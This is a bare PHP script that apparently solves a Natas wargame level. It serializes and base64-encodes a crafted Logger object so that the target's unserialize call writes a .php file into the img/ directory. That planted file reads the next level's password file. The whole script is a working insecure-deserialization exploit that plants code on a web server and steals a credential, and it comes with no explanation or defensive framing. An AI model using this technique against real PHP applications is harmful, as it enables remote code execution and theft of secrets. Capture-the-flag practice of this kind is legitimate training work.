<?php

$random_name = $argv[1];

class Logger
{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($random_name)
    {
        $this->initMsg = "Anything goes here";
        $this->exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
        $this->logFile = "img/" . $random_name . ".php";
    }
}

$object = new Logger($random_name);
print(base64_encode(serialize($object)));
?>
